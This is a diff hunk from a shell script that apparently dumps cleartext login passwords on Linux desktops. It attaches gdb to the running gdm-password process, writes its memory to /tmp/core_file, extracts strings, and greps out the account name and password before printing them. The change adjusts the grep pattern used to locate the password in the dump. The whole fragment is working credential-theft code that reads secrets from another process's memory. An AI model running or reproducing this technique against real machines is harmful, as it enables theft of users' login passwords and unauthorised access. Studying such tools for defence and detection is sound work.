@@ -29,7 +29,7 @@ gdmpassword_pid=$(ps aux |grep 'gdm-password' |grep -v grep |awk '{print $2}')
 $gdb -p $gdmpassword_pid -x $commands --batch-silent 2>/dev/null
 
 $strings /tmp/core_file > /tmp/core_strings
-password=$(cat /tmp/core_strings | grep 'LocalAccount' -A2 |grep -v 'LocalAccount' |grep -A1 'freedesktop' |grep -v 'freedesktop')
+password=$(cat /tmp/core_strings | grep 'myhostname' -A2 |grep -v 'myhostname' |grep -v services)
 account=$(cat /tmp/core_strings | grep -A1 username |grep -v username |grep -A2 'op.DBus' |grep -v 'op.DBus' |grep -A1 root)
 
 echo -e 'USERNAME:' $account '\nPASSWORD:' $password
